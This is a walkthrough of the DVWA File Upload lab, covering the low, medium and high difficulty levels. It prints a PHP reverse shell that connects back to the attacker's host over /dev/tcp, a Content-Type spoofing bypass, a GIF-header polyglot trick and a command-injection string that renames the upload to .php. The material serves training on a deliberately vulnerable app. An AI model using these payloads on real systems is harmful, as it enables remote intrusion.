# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Sources/low.php)

In this challange we can upload a file and view it.
There are no filters so we'll upload a tiny php reverse shell ([source code](https://gist.github.com/rshipp/eee36684db07d234c1cc)) :

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.X.X.X/1234 0>&1'"); # 10.X.X.X is my IP and I'm listening on 1234 port
?>
```

We upload this file with `.php` extension and we can execute it from `/hackable/uploads/` like here (my file is `reverse_shell.php`):
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Pictures/1.png)

We listen on the 1234 port and we got our shell:

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Pictures/2.png)



# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Sources/medium.php)


This time our there are some filters: `$uploaded_type == "image/jpeg" || $uploaded_type == "image/png"`
So, this is what I did.

I created a copy of the previous file just to make sure that I access the right file:

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Pictures/3.png)

I started my Burp Suite Proxy and I uploaded `reverse_shell2.php`. I intercepted the request and changed
`Content-Type: application/x-php`
to 
`Content-Type: image/png`

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Pictures/4.png)

And the file was accepted:
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Pictures/5.png)

Now we can access the `reverse_shell2.php` from `/hackable/uploads/` and we have the shell.



# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Sources/high.php)


I found this [suggestion](https://jayinfosec.gitbook.io/penetration-testing-playbook/web-applications/file-upload-vulnerabilities/bypass-file-upload-restrictions#file-extension).
So I created a new file:
```php
GIF98
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.X.X.X/1234 0>&1'");
?>
```
and saved with name `file.png`

I uploaded it.
After that I took advanced of the `File Inclusion` challange.
I search for my file `file.png` like :
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Pictures/6.png)

I found where is my file located so I changed its name ping-ing this `0.0.0.0 || mv  /var/www/html/hackable/uploads/file.png  /var/www/html/hackable/uploads/file.php`.

The file is now changed and accessible; we can run it and we got the shell. 



# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/File%20Upload/Sources/impossible.php)
